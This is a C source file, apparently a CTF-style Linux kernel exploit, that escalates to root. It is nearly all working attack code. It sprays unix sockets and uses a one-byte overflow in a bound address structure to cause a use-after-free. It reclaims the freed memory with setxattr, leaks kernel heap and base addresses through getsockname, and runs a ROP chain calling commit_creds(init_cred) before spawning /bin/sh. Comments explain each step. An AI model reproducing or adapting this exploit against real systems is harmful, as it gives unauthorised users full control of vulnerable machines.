#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/resource.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h> 
#include <sys/xattr.h>
#include <time.h>
#include <unistd.h>
#include <sys/un.h>
#include <stddef.h>

typedef uint64_t u64;
typedef uint32_t u32;

#define sock() socket(AF_UNIX, SOCK_STREAM, 0)

void dobind(int fd, char *name, int len)
{
    struct sockaddr_un addr = {};
	addr.sun_family = AF_UNIX;
	addr.sun_path[0] = 0;
	memcpy(addr.sun_path+1, name, 4);
	if (bind(fd, (struct sockaddr *)&addr, len) < 0) {
		perror("bind");
		exit(1);
	}
}

void dobind_pl(int fd, char *name, int len, char *pl)
{
    struct sockaddr_un addr = {};
	addr.sun_family = AF_UNIX;
	addr.sun_path[0] = 0;
	memcpy(addr.sun_path+1, name, 4);
	for (int i = 8; i < len; i++)
		((char*)&addr)[i] = pl[i];
	if (bind(fd, (struct sockaddr *)&addr, len) < 0) {
		perror("bind");
		exit(1);
	}
}

void doconn(int fd, char *name, int len)
{
	struct sockaddr_un addr = {};
	addr.sun_family = AF_UNIX;
	addr.sun_path[0] = 0;
	memcpy(addr.sun_path+1, name, 4);
	if (connect(fd, (struct sockaddr *)&addr, len) < 0) {
		perror("connect");
		exit(1);
	}
}

int doacc(int fd)
{
	int ret = accept(fd, 0, 0);
	if (ret < 0) {
		perror("accept");
		exit(1);
	}
	return ret;
}

void dolist(int fd, int n)
{
	if (listen(fd, n) < 0) {
		perror("listen");
		exit(1);
	}
}

void getname(int fd, struct sockaddr_un *addr)
{
	socklen_t len = 0x40;
    if (getsockname(fd, addr, &len) < 0) {
        perror("getsockname");
		exit(1);
    }
}

#define XATTR_FILE "/tmp/xattr"
#define STACK 0xcafe0000000

#define SZ (32-8)

int win()
{
	puts("winning!");
	char *argv[2] = {
		"/bin/sh",
		0,
	};
	execve("/bin/sh", argv, 0);
	system("id; sh");

}

int pwn()
{
	int xfd = open(XATTR_FILE, O_WRONLY|O_CREAT, 0644);
	if (xfd < 0) {
		perror("open");
		exit(1);
	}
	close(xfd);
	if (mmap((void*)(STACK-0x10000), 0x100000, 7, MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0)
		!= (void*)(STACK-0x10000)) {
		perror("mmap");
		exit(1);
	}

	// we have a 1 byte overflow
	// from the unix_address structure which can
	// range in size from 8 to 118.
	// the first field is refcount,
	// so we can easily convert this to a UAF.
	// we can then get info leaks because
	// the length for getname is stored
	// in this UAFd structure.
	// 
	// note that incing a 0 refcount
	// saturates it so we need a non-null
	// byte to overflow. luckily the memory
	// is uninitialized so we can spray on the
	// prior stack frame to control the byte.
	// i tried variety of things and the only
	// consistent thing i could get
	// was 0x13 at the 32 boundary from
	// __schedule+0x3f3. im sure there are
	// better spray techniques, but we
	// can work with this, because we
	// just have to get the refcount up
	// to 0x14 for a UAF which is trivial.
	// UPDATE: spraying 0x01 also works
	// occasionally so im just going with this.
	//
	// after UAF, we reclaim with xsetattr,
	// make len field large,
	// getname on B now leaks next chunks.
	//
	// for code execution, we actually
	// also have a stack buffer overflow
	// from increasing the len field.
	// unix_getname memcpys into stack var
	// from __sys_getsockname with
	// any length in the structure.
	// so by controlling subsequent heap
	// contents we can ROP
	
	// we assume the freelist is initially
	// sequential, which is usually true.
	// to make this more reliable, we first spray
	// a lot of socks to get a clean slab. 
	
	// first do this whole process in kmalloc-32
	// to get kbase with seq_operations
	//
	// then do it in kmalloc-64
	// so its easier to spray data
	// for our ROP
	#define N_SPRAY (240-40)
	int spray[N_SPRAY];
	for (int i = 0; i < N_SPRAY; i++) {
		spray[i] = sock();
		char buf[8] = {};
		sprintf(buf, "X%d", i);
		dobind(spray[i], buf, SZ-1);
	}
	puts("done spraying, continue?");
	//getchar();
	
	int s1 = sock();
	int s2 = sock();
	int s3 = sock();
	int s4 = sock();

	#define N_CLI 1
	int cli[N_CLI];
	int acc[N_CLI];
	for (int i = 0; i < N_CLI; i++)
		cli[i] = sock();


	puts("[+] binding launchpad");
	dobind(s1, "AAAA", SZ);
	puts("[+] binding victim");
	dobind(s2, "BBBB", SZ);

	int seq_fd = open("/proc/self/stat", O_RDONLY);

	puts("[+] accepting conns");
	dolist(s2, 100);
	for (int i = 0; i < N_CLI; i++)
		doconn(cli[i], "BBBB", SZ);
	for (int i = 0; i < N_CLI; i++)
		acc[i] = doacc(s2);

	// free s1 so next bind overflows into s2
	close(s1);
	int dummy1 = sock();
	puts("[+] bind overflow");
	struct sockaddr_un addr;
	memset(&addr, 1, sizeof(struct sockaddr_un));
	addr.sun_family = AF_UNIX;
	addr.sun_path[0] = 0;
	if (bind(s4, (struct sockaddr *)&addr, 100) < 0) {
		perror("bind");
		exit(1);
	}

	dobind(s3, "CCCC", SZ);

	puts("continue?");
	//getchar();

	close(cli[0]);
	close(acc[0]);

	puts("[+] triggered uaf");
	struct sockaddr_un leak_buf;
	getname(s2, &leak_buf);
	char *leak = (char*)&leak_buf;
	u64 heap = *((u64*)leak+1);
	printf("[+] kheap = %p\n", (void*)heap);


	// eat random chunk that got in between
	int dummy = sock();

	char pl[32] = {};
	((u32*)pl)[0] = 1;
	((u32*)pl)[1] = 0x30;
    setxattr(XATTR_FILE, "pwn", pl, 32, 0);

	getname(s2, &leak_buf);
	u64 kbase = *((u64*)leak+4);
	kbase -= 0x2e3400;
	printf("[+] kbase = %p\n", (void*)kbase);

	puts("continue?");
	//getchar();

	// commit_creds(init_cred)
	u64 rflags = 0x246;
	u64 poprsp = kbase+0x1da98c;
	u64 rop[28] = {};
	rop[0] = rflags;
	rop[1] = 0xcafe;
	rop[2] = 0xbabe;
	rop[3] = 0; // clobbered
	rop[4] = rflags;
	rop[5] = 0xcafe;
	rop[6] = 0xbabe;
	rop[7] = 0; // clobbered
	rop[8] = 0; // clobbered
	rop[9] = rflags;
	rop[10] = 0xcafe;
	rop[11] = 0xbabe;
	rop[12] = rflags;
	rop[13] = 0xcafe;
	rop[14] = 0xbabe;
	rop[15] = 0; // clobbered
	rop[16] = 0; // clobbered
	rop[17] = rflags;
	rop[18] = 0xcafe;
	rop[19] = 0xbabe;
	rop[20] = rflags;
	rop[21] = poprsp;
	rop[22] = rflags;
	rop[23] = 0; // clobbered
	rop[24] = 0; // clobbered
	rop[25] = rflags;
	rop[26] = 0xcafe;

	int rs1 = sock();
	int rs2 = sock();
	int rs3 = sock();
	int gr1 = sock();
	int gr2 = sock();

#define SZ (64-8)

#define N_SPRAY ((240-40))
	for (int i = 0; i < N_SPRAY; i++) {
		spray[i] = sock();
		char buf[8] = {};
		sprintf(buf, "%d", i);
		dobind(spray[i], buf, SZ-1);
	}
	puts("done spraying, continue?");
	//getchar();

	s1 = sock();
	s2 = sock();
	s3 = sock();
	s4 = sock();

#define N_CLI 1
	for (int i = 0; i < N_CLI; i++)
		cli[i] = sock();


	puts("[+] binding launchpad");
	dobind(s1, "DDDD", SZ);
	puts("[+] binding victim");
	dobind(s2, "EEEE", SZ);

	// bind rop socks with payloads
	dobind_pl(rs1, "ROP1", SZ, (char*)rop+7*8+8);
	dobind_pl(rs2, "ROP2", SZ, (char*)rop+15*8+8);
	dobind_pl(rs3, "ROP3", SZ, (char*)rop+23*8+8);

	u64 poprdi = kbase+0xd4dd6d;
	u64 initcred = kbase+0x1a52d00;
	u64 commit_creds = kbase+0xc07b0;
	u64 tramp_popdisp = kbase+0x1000168;
	u64 poprcx = kbase+0x30d815;
	u64 pop2 = kbase+0xbb793e;

	u64 gop1[7] = {};
	gop1[1] = poprdi;
	gop1[2] = initcred;
	gop1[3] = commit_creds;
	gop1[4] = poprcx;
	gop1[5] = (u64)win;
	gop1[6] = tramp_popdisp;
	dobind_pl(gr1, "GOD1", SZ, (char*)gop1);
	u64 gop2[7] = {};
	gop2[1] = tramp_popdisp;
	gop2[2] = 0xdeadbeefcafe0002;
	gop2[3] = 0xcafebabe;
	gop2[4] = STACK;
	gop2[5] = 0xdeadbeefcafe0005;
	gop2[6] = 0xdeadbeefcafe0006;
	dobind_pl(gr2, "GOD2", SZ, (char*)gop2);
	

	puts("[+] accepting conns");
	dolist(s2, 100);
	for (int i = 0; i < N_CLI; i++)
		doconn(cli[i], "EEEE", SZ);
	for (int i = 0; i < N_CLI; i++)
		acc[i] = doacc(s2);

	close(s1);
	puts("[+] bind overflow");
	memset(&addr, 1, sizeof(struct sockaddr_un));
	addr.sun_path[1] = 2;
	addr.sun_family = AF_UNIX;
	addr.sun_path[0] = 0;
	if (bind(s4, (struct sockaddr *)&addr, 100) < 0) {
		perror("bind");
		exit(1);
	}
	dobind(s3, "FFFF", SZ);

	close(cli[0]);
	close(acc[0]);

	dummy = sock();

	char pl1[64] = {};
	((u32*)pl1)[0] = 1;
	((u32*)pl1)[1] = 0x40;
    setxattr(XATTR_FILE, "pwn", pl1, 64, 0);
	getname(s2, &leak_buf);
	u64 heap2 = *((u64*)leak+3);
	heap2 -= 0x70;
	printf("[+] heap2 = %p\n", (void*)heap2);

	close(rs2);
	rs2 = sock();
	rop[22] = heap2;
	dobind_pl(rs2, "ROP2", SZ, (char*)rop+15*8+8);


	char pl2[64] = {};
	((u32*)pl2)[0] = 1;
	((u32*)pl2)[1] = 0xd0;
	for (int i = 0; i < 7; i++)
		((u64*)pl2)[i+1] = rop[i];
    setxattr(XATTR_FILE, "pwn", pl2, 64, 0);
	getname(s2, &leak_buf);

	return 0;
}

int main(int argc, char **argv)
{
	return pwn();
}
